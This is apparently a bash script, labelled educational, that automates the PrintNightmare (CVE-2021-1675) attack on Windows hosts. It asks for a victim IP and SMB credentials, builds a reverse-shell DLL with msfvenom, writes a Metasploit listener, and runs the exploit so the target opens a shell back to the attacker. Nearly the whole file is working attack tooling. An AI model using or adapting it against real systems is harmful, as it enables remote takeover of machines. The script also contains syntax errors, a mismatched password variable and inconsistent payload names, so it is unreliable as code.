#!/bin/bash
#  EDUCATIONAL PURPOSES ONLY

echo -e "[*] Target IP Address"
read -p "0=freddy(victim)> " target
echo -e "[*] Target SMB Username: "
read -p "0=freddy(smb/user)> " user
echo -e "[*] Target SMB Password: "
read -p "0=freddy(smb/pass)> " pass

echo -e "[*] Grabbing internal hostname"
sleep 2
ipaddr=$(hostname -I | awk '{print $1}')
echo "[?] Use $ipaddr

echo -e "[*] Enter Port Number(default 4444): "
read -p "0=freddy(port)> "
if [ -z "$port" ]
then
	$port=4444
fi

clear

echo -e "[*] Creating Payload"
sleep 1
msfvenom -p windows/x64/reverse_shell_tcp LHOST=$ipaddr LPORT=$port -o elmStreet.dll
# listener
touch dreams.rc
	echo "use exploit/multi/handler
	set PAYLOAD windows/x64/shell_reverse_tcp
	set LHOST $ipaddr
	set LPORT $port
	set ExitOnSession false
	exploit -j -z" > dreams.rc

echo -e "[*] Listener Created (dreams.rc)"
sleep 2
clear

if [ -f CVE-2021-1675.py ]
then
	read -r -p "[?] Run Exploit on $target" exploit
	if [[ $exploit =~ ^[Yy]$ ]]
	then
		sudo ./CVE-2021-1675.py PRINTNIGHTMARE.local/$user:$password@$target '\\$ipaddr\smb\elmStreet.dll'
	else
	then
		echo "Exiting.. hack the gibson!"
	fi
else
then
	echo "[*] Download PrintNightmare from github"
	echo "	$ git clone https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/main/CVE-2021-1675.py"
fi

echo "Exiting.. Hack the Gibson!"
